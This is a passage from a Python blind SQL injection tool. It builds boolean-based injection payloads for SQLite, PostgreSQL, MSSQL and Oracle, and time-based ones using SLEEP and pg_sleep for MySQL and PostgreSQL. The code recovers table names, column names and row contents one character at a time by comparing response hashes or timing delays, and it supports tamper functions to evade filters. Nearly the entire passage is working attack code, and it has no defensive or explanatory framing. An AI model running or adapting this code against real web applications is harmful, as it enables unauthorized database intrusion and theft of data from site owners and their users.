            ok = bool_check_sqlite(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok = bool_check_sqlite(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"bool_get_len_sqlite error: {str(e)}", "ERROR")
        return None

def bool_get_char_ord_sqlite(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    safe_tamper = _safe_tamper_for_sqlite(tamper_func)
    try:
        lo = low
        hi = high
        ranges = [(32, 47), (48, 57), (58, 64), (65, 90), (91, 96), (97, 122), (123, 126)]
        for r_low, r_high in ranges:
            cond = f"UNICODE(SUBSTR(LOWER(({sql_expr})),{pos},1)) BETWEEN {r_low} AND {r_high}"
            ok = bool_check_sqlite(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                lo = r_low
                hi = r_high
                break
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"UNICODE(SUBSTR(LOWER(({sql_expr})),{pos},1)) > {mid}"
            ok = bool_check_sqlite(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"bool_get_char_ord_sqlite error: {str(e)}", "ERROR")
        return None

def bool_get_string_sqlite(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    safe_tamper = _safe_tamper_for_sqlite(tamper_func)
    try:
        length = bool_get_len_sqlite(session, url, base_params, param_name, sql_expr, true_sha, http_method, safe_tamper, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = bool_get_char_ord_sqlite(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method, safe_tamper)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"bool_get_string_sqlite error: {str(e)}", "ERROR")
        return ""

def bool_enumerate_tables_sqlite(session, url, base_params, param_name, true_sha, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (boolean-based, SQLite)...", "START")
        if not true_sha:
            true_sha = calibrate_true_sha_sqlite(session, url, base_params, param_name, http_method, tamper_func)
            if not true_sha:
                return []
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i})"
            name = bool_get_string_sqlite(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name or name.strip() == "":
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"bool_enumerate_tables_sqlite error: {str(e)}", "ERROR")
        return []

def bool_enumerate_columns_sqlite(session, url, base_params, param_name, table_name, true_sha, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        if not true_sha:
            true_sha = calibrate_true_sha_sqlite(session, url, base_params, param_name, http_method, tamper_func)
            if not true_sha:
                return []
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT name FROM PRAGMA_table_info('{safe_table}') ORDER BY cid LIMIT 1 OFFSET {i})"
            name = bool_get_string_sqlite(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name or name.strip() == "":
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"bool_enumerate_columns_sqlite error: {str(e)}", "ERROR")
        return []

def bool_extract_rows_sqlite(session, url, base_params, param_name, table_name, columns, true_sha, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        if not true_sha:
            true_sha = calibrate_true_sha_sqlite(session, url, base_params, param_name, http_method, tamper_func)
            if not true_sha:
                return []
        rows = []
        order_by = get_order_by_clause("SQLite", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} LIMIT 1 OFFSET {row_idx})"
                cell_value = bool_get_string_sqlite(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"bool_extract_rows_sqlite error: {str(e)}", "ERROR")
        return []

# ================== POSTGRESQL BOOLEAN-BASED ==================
def bool_check_pgsql(session, url, base_params, param_name, condition_sql, true_sha, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"' AND ({condition_sql}) --")
        params = base_params.copy()
        params[param_name] = payload
        hashes = []
        for retry in range(RETRIES):
            text, _, _ = make_request(session, url, params, http_method)
            if text:
                sha = hash_text(text)
                hashes.append(sha)
            time.sleep(SLEEP_BETWEEN)
        most_common_sha = Counter(hashes).most_common(1)[0][0] if hashes else None
        result = most_common_sha == true_sha
        return result
    except Exception as e:
        _log(f"bool_check_pgsql error: {str(e)}", "ERROR")
        return False

def bool_get_len_pgsql(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
            ok = bool_check_pgsql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok = bool_check_pgsql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"bool_get_len_pgsql error: {str(e)}", "ERROR")
        return None

def bool_get_char_ord_pgsql(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        ranges = [(32, 47), (48, 57), (58, 64), (65, 90), (91, 96), (97, 122), (123, 126)]
        for r_low, r_high in ranges:
            cond = f"ASCII(SUBSTR(LOWER(({sql_expr})),{pos},1)) BETWEEN {r_low} AND {r_high}"
            ok = bool_check_pgsql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                lo = r_low
                hi = r_high
                break
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTR(LOWER(({sql_expr})),{pos},1)) > {mid}"
            ok = bool_check_pgsql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"bool_get_char_ord_pgsql error: {str(e)}", "ERROR")
        return None

def bool_get_string_pgsql(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = bool_get_len_pgsql(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = bool_get_char_ord_pgsql(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"bool_get_string_pgsql error: {str(e)}", "ERROR")
        return ""

def bool_enumerate_tables_pgsql(session, url, base_params, param_name, true_sha, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (boolean-based, PostgreSQL)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET {i})"
            name = bool_get_string_pgsql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"bool_enumerate_tables_pgsql error: {str(e)}", "ERROR")
        return []

def bool_enumerate_columns_pgsql(session, url, base_params, param_name, table_name, true_sha, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT column_name FROM information_schema.columns WHERE table_name = '{safe_table}' AND table_schema = 'public' ORDER BY ordinal_position LIMIT 1 OFFSET {i})"
            name = bool_get_string_pgsql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"bool_enumerate_columns_pgsql error: {str(e)}", "ERROR")
        return []

def bool_extract_rows_pgsql(session, url, base_params, param_name, table_name, columns, true_sha, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("PostgreSQL", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} LIMIT 1 OFFSET {row_idx})"
                cell_value = bool_get_string_pgsql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"bool_extract_rows_pgsql error: {str(e)}", "ERROR")
        return []

# ================== MSSQL BOOLEAN-BASED ==================
def bool_check_mssql(session, url, base_params, param_name, condition_sql, true_sha, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"' AND ({condition_sql}) --")
        params = base_params.copy()
        params[param_name] = payload
        hashes = []
        for retry in range(RETRIES):
            text, _, _ = make_request(session, url, params, http_method)
            if text:
                sha = hash_text(text)
                hashes.append(sha)
            time.sleep(SLEEP_BETWEEN)
        most_common_sha = Counter(hashes).most_common(1)[0][0] if hashes else None
        result = most_common_sha == true_sha
        return result
    except Exception as e:
        _log(f"bool_check_mssql error: {str(e)}", "ERROR")
        return False

def bool_get_len_mssql(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LEN(({sql_expr})) <= {upper}"
            ok = bool_check_mssql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LEN(({sql_expr})) <= {mid}"
            ok = bool_check_mssql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"bool_get_len_mssql error: {str(e)}", "ERROR")
        return None

def bool_get_char_ord_mssql(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        ranges = [(32, 47), (48, 57), (58, 64), (65, 90), (91, 96), (97, 122), (123, 126)]
        for r_low, r_high in ranges:
            cond = f"ASCII(SUBSTRING(LOWER(({sql_expr})),{pos},1)) BETWEEN {r_low} AND {r_high}"
            ok = bool_check_mssql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                lo = r_low
                hi = r_high
                break
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(LOWER(({sql_expr})),{pos},1)) > {mid}"
            ok = bool_check_mssql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"bool_get_char_ord_mssql error: {str(e)}", "ERROR")
        return None

def bool_get_string_mssql(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = bool_get_len_mssql(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = bool_get_char_ord_mssql(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"bool_get_string_mssql error: {str(e)}", "ERROR")
        return ""

def bool_enumerate_tables_mssql(session, url, base_params, param_name, true_sha, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (boolean-based, MSSQL)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT name FROM sys.tables ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)"
            name = bool_get_string_mssql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"bool_enumerate_tables_mssql error: {str(e)}", "ERROR")
        return []

def bool_enumerate_columns_mssql(session, url, base_params, param_name, table_name, true_sha, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('{safe_table}') ORDER BY column_id OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)"
            name = bool_get_string_mssql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"bool_enumerate_columns_mssql error: {str(e)}", "ERROR")
        return []

def bool_extract_rows_mssql(session, url, base_params, param_name, table_name, columns, true_sha, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("MSSQL", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} OFFSET {row_idx} ROWS FETCH NEXT 1 ROWS ONLY)"
                cell_value = bool_get_string_mssql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"bool_extract_rows_mssql error: {str(e)}", "ERROR")
        return []

# ================== ORACLE BOOLEAN-BASED ==================
def _safe_tamper_for_oracle(tamper_func):
    func_name = tamper_func.__name__
    if func_name in ("tamper_space_to_plus", "tamper_single_urlencode"):
        return tamper_none
    return tamper_func

def bool_check_oracle(session, url, base_params, param_name, condition_sql, true_sha, http_method='GET', tamper_func=tamper_none):
    safe_tamper = _safe_tamper_for_oracle(tamper_func)
    try:
        payload = safe_tamper(f"' AND ({condition_sql}) --")
        params = base_params.copy()
        params[param_name] = payload
        hashes = []
        for retry in range(RETRIES):
            text, _, _ = make_request(session, url, params, http_method)
            if text:
                sha = hash_text(text)
                hashes.append(sha)
            time.sleep(SLEEP_BETWEEN)
        most_common_sha = Counter(hashes).most_common(1)[0][0] if hashes else None
        result = most_common_sha == true_sha
        return result
    except Exception as e:
        _log(f"bool_check_oracle error: {str(e)}", "ERROR")
        return False

def bool_get_len_oracle(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    safe_tamper = _safe_tamper_for_oracle(tamper_func)
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
            ok = bool_check_oracle(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok = bool_check_oracle(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"bool_get_len_oracle error: {str(e)}", "ERROR")
        return None

def bool_get_char_ord_oracle(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    safe_tamper = _safe_tamper_for_oracle(tamper_func)
    try:
        lo = low
        hi = high
        ranges = [(32, 47), (48, 57), (58, 64), (65, 90), (91, 96), (97, 122), (123, 126)]
        for r_low, r_high in ranges:
            cond = f"ASCII(SUBSTR(LOWER(({sql_expr})),{pos},1)) BETWEEN {r_low} AND {r_high}"
            ok = bool_check_oracle(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                lo = r_low
                hi = r_high
                break
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTR(LOWER(({sql_expr})),{pos},1)) > {mid}"
            ok = bool_check_oracle(session, url, base_params, param_name, cond, true_sha, http_method, safe_tamper)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"bool_get_char_ord_oracle error: {str(e)}", "ERROR")
        return None

def bool_get_string_oracle(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    safe_tamper = _safe_tamper_for_oracle(tamper_func)
    try:
        length = bool_get_len_oracle(session, url, base_params, param_name, sql_expr, true_sha, http_method, safe_tamper, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = bool_get_char_ord_oracle(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method, safe_tamper)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"bool_get_string_oracle error: {str(e)}", "ERROR")
        return ""

def bool_enumerate_tables_oracle(session, url, base_params, param_name, true_sha, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (boolean-based, Oracle)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM all_tables WHERE owner = USER) WHERE rn = {i+1})"
            name = bool_get_string_oracle(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"bool_enumerate_tables_oracle error: {str(e)}", "ERROR")
        return []

def bool_enumerate_columns_oracle(session, url, base_params, param_name, table_name, true_sha, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.upper().replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name = '{safe_table}' AND owner = USER ORDER BY column_id) WHERE rn = {i+1})"
            name = bool_get_string_oracle(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"bool_enumerate_columns_oracle error: {str(e)}", "ERROR")
        return []

def bool_extract_rows_oracle(session, url, base_params, param_name, table_name, columns, true_sha, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("Oracle", table_name, pk_cols, columns)
        safe_table = table_name.upper().replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.upper().replace("'", "''")
                expr = f"(SELECT {safe_col} FROM (SELECT {safe_col}, ROWNUM AS rn FROM {safe_table} {order_by}) WHERE rn = {row_idx+1})"
                cell_value = bool_get_string_oracle(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"bool_extract_rows_oracle error: {str(e)}", "ERROR")
        return []

# ================== MYSQL TIME-BASED ==================
def time_check_mysql(session, url, base_params, param_name, condition_sql, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"1' AND IF({condition_sql},SLEEP({MYSQL_DELAY}),0) -- -")
        params = base_params.copy()
        params[param_name] = payload
        text, elapsed, _ = make_request(session, url, params, http_method)
        ok = elapsed > TIME_THRESHOLD if elapsed is not None else False
        return ok, elapsed, text
    except Exception as e:
        _log(f"time_check_mysql error: {str(e)}", "ERROR")
        return False, None, None

def time_get_len_mysql(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
            ok, _, _ = time_check_mysql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok, _, _ = time_check_mysql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"time_get_len_mysql error: {str(e)}", "ERROR")
        return None

def time_get_char_ord_mysql(session, url, base_params, param_name, sql_expr, pos, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(MID(({sql_expr}),{pos},1)) > {mid}"
            ok, _, _ = time_check_mysql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"time_get_char_ord_mysql error: {str(e)}", "ERROR")
        return None

def time_get_string_mysql(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = time_get_len_mysql(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = time_get_char_ord_mysql(session, url, base_params, param_name, sql_expr, pos, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"time_get_string_mysql error: {str(e)}", "ERROR")
        return ""

def time_enumerate_tables_mysql(session, url, base_params, param_name, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (time-based, MySQL)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET {i})"
            name = time_get_string_mysql(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"time_enumerate_tables_mysql error: {str(e)}", "ERROR")
        return []

def time_enumerate_columns_mysql(session, url, base_params, param_name, table_name, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT column_name FROM information_schema.columns WHERE table_name = '{safe_table}' AND table_schema = database() ORDER BY ordinal_position LIMIT 1 OFFSET {i})"
            name = time_get_string_mysql(session, url, base_params, param_name, expr, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"time_enumerate_columns_mysql error: {str(e)}", "ERROR")
        return []

def time_extract_rows_mysql(session, url, base_params, param_name, table_name, columns, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("MySQL", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} LIMIT 1 OFFSET {row_idx})"
                cell_value = time_get_string_mysql(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"time_extract_rows_mysql error: {str(e)}", "ERROR")
        return []

# ================== POSTGRESQL TIME-BASED ==================
def time_check_pgsql(session, url, base_params, param_name, condition_sql, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"' AND CASE WHEN ({condition_sql}) THEN pg_sleep({PGSQL_DELAY}) ELSE 0 END --")
        params = base_params.copy()
        params[param_name] = payload
        text, elapsed, _ = make_request(session, url, params, http_method)
        ok = elapsed > TIME_THRESHOLD if elapsed is not None else False
        return ok, elapsed, text
    except Exception as e:
        _log(f"time_check_pgsql error: {str(e)}", "ERROR")
        return False, None, None

def time_get_len_pgsql(session, url, base_params, param_name, sql_expr, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
            ok, _, _ = time_check_pgsql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok, _, _ = time_check_pgsql(session, url, base_params, param_name, cond, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"time_get_len_pgsql error: {str(e)}", "ERROR")
        return None

def time_get_char_ord_pgsql(session, url, base_params, param_name, sql_expr, pos, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        while lo < hi:
            mid = (lo + hi) // 2
